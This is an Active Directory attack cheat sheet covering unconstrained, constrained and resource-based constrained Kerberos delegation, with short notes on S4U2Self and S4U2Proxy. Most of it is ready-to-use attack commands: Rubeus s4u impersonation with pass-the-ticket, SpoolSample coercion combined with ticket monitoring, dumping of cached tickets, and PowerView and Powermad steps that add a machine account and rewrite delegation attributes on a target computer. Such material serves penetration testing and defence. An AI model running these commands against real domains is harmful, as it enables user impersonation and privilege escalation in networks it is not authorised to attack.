# Unconstrained Delegation
An account with a set SPN (e.g. Service A) can impersonate a user using the service set via the SPN at any other service in Active Directory. For this purpose, the service can use the user's ticket granting ticket, which is send together with the TGS for Service A.

## Prerequisites
```
NOT_DELEGATED UAC flag of target user must be false
TRUSTED_FOR_DELEGATION UAC flag in the attributes of the attacker account associated SPN must be true (only domain admins have typically the SeEnableDelegationPrivilege right to change this flag)
```

## Result
Domain Controller responds with target user TGT

## Commands
- Using S4U2Self
```
Invoke-Rubeus -Command 's4u /user:<attackerComputerA> /rc4:<attackerNtlmHash> /impersonateuser:<targetUser> /msdsspn:"cifs/<fqdnTargetComputerB>" /ptt'
```

- Using spoolservice (rubeus monitor needs elevated context)
```
Invoke-Rubeus -Command 'monitor /interval:1'
SpoolSample.exe <targetComputer> <attackerComputer>
```

- Using cached ticket
```
Invoke-Rubeus -Command 'dump'
Invoke-Rubeus -Computer 'ptt /ticket:<base64Ticket>'
```


# Constrained Delegation
An account with a set SPN (e.g. Computer A with Service A) can impersonate a user using Service A towards other services in Active Directory. Impersonation can be applied to services (e.g. Service B) defined in the msDS-AllowedToDelegateTo attribute of Computer A. The impersonation is performed by using the S4U2Proxy Extension, after the user authenticates to Service A. It is also possible to impersonate the user for an alternative service, as long as these service are provided by Computer B. This is because the service part of the SPN (<spn>/<fqdn>) in a service ticket is not signed by Kerberos and thus can later be manipulated.

## Prerequisites
```
NOT_DELEGATED UAC flag of target user must be false
msDS-AllowedToDelegateTo attribute of Computer A must hold Service B 
```

## Result
Domain Controller responds with TGS of target user for Service B - this TGS can be used for alternative services provided on Computer B

## Commands
- Check allowed SPNs
```
Get-DomainUser <attackerComputerA> -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
```

- If SPN already contains cifs or desired service as SPN
```
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<targetUser>')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
```

- Otherwise ask for TGS and insert alternative service
```
Invoke-Rubeus -Command 's4u /user:<attackerComputerA> /rc4:<ntlmHashComputerA> /impersonateuser:<targetUser> /msdsspn:"<service>/<fqdnTargetComputerB>" /altservice:cifs /ptt'
```


# Resource Based Constrained Delegation
An account (e.g. Computer A) with set SPN (e.g. Service A) can impersonate a user using Service A towards other services (e.g. Service B of Computer B) in Active Directory. Impersonation can only take place if the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of Service B lists Computer A.

## Prerequisites
```
NOT_DELEGATED UAC flag of target user must be false
msDS-AllowedToActOnBehalfOfOtherIdentity attribute of Computer B must hold Service A 
One Domaincontroller with OS at least Windows Server 2012
```

## Result
Domain Controller responds with TGS of target user for Service A - this TGS can be used for alternative services

## Commands
- Check machine account quota (powerview)
```
Get-DomainObject -Domain <domain> -Properties ms-ds-machineaccountquota | Select -First 1
```

- Check DC OS
```
Get-NetDomainController | Select name,osversion | Format-List
```

- Check present SPN in msDS-AllowedToActOnBehalfOfOtherIdentity attribute
```
Get-NetComputer <targetComputer> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

- Add new computer to domain if necessary (powermad)
```
New-MachineAccount -MachineAccount <newComputer> -Password $(ConvertTo-SecureString '<newComputerPassword>' -AsPlainText -Force)
```

- Get SID of new computer
```
Get-NetComputer <newComputer> -Properties objectsid | Select -Expand objectsid
```

- Create a raw security descriptor for the new computer
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<newComputerSid>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

- Add new value to msDS-AllowedToActOnBehalfOfOtherIdentity attribute
```
Get-NetComputer <targetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

- Check added msDS-AllowedToActOnBehalfOfOtherIdentity attribute
```
Get-NetComputer <targetComputer> -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

- Ask for TGS
```
Invoke-Rubeus -Command 's4u /user:<newComputer> /rc4:<newComputerNtlmHash> /impersonateuser:<targetUser> /msdsspn:cifs/<fqdnTargetComputerB> /ptt'
```

# S4U2Proxy
The service for User to Proxy Extension allows a service that has a service ticket from a user for its own service to request a service ticket from the domain controller on behalf of     the user for other services. The S4U2Proxy extension works for resource-based constrained delegation even if the provided TGS of the user is not forwardable (design error of microsoft).

# S4U2Self
The service-for-User-to-Self extension allows a service to obtain a service ticket to itself on behalf of a arbitrary user. In order to work, the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION UAC flag of Service A need to be set to true. If the flag is not true the resulting TGS of user X will not be forwardable.

